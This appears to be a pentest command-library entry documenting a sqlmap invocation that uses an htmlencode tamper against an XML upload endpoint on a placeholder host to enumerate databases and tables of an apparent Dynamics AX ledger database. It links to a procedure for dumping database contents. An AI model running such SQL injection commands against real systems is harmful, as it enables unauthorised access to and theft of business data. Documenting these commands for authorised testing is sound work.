---
id: c-sqlmap-enum-tables
data: >-
  sqlmap -u "http://target-subdomain.example.com/upload"
  --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dbs
  --tables -D dynamics_ax_db
tags:
  - sqli
  - enum
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.270Z'
verified: false
validated: true
submitted: true
---
# sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dbs --tables -D dynamics_ax_db

## Command

```bash
sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dbs --tables -D dynamics_ax_db
```

## Description

Enumerates databases and tables.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--tables` | List tables | Yes |
| `-D` | Database | No |

## Examples

### Basic Usage

```bash
sqlmap ... --tables
```

## Expected Output

Table list: LedgerJournalTrans, etc.

## Related

- [[procedures/Dump-Database-Contents-with-sqlmap]]
